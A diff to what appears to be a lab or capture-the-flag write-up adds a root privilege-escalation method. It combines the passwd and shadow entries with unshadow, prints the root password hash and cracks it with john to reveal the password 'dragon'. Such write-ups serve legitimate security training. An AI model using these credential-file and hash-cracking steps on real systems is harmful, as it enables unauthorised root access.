@@ -415,6 +415,8 @@ www-data@srv-99-590:~/html$
 
 - Now we have a shell as the www-data user
 
+### Method 3 - Brute Force SSH
+
 
 ## Local Enumeration 
 
@@ -434,8 +436,32 @@ curl -L https://github.com/carlospolop/PEASSng/releases/latest/download/linpeas.
 ### Method 1
 - Crack root password using john
 - We have to combine the /etc/passwd entry for root and /etc/shadow entry for root 
-- 
 
+```
+┌──(kali㉿kali-99-590)-[~/exploits]
+└─$ unshadow passwd.txt shadow.txt > unshadowed.txt
+Created directory: /home/kali/.john
+┌──(kali㉿kali-99-590)-[~/exploits]
+└─$ cat unshadowed.txt
+root:$5$BN8CmDdqe6QVOQkm$tuYdx49auWDZW3JZzsN9GKgriNTSAlSc/Js723Zvvv8:0:0:root:/root:/bin/bash
+```
+
+- Run john to crack the password
+```
+┌──(kali㉿kali-99-590)-[~/exploits]
+└─$ john --wordlist=/usr/share/wordlists/fasttrack.txt unshadowed.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha256crypt, crypt(3) $5$ [SHA256 512/512 AVX512BW 16x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+dragon           (root)
+1g 0:00:00:00 DONE (2023-03-06 15:52) 8.333g/s 1850p/s 1850c/s 1850C/s Spring2017..starwars
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+- And this shows roots password is **dragon**
 
 
 
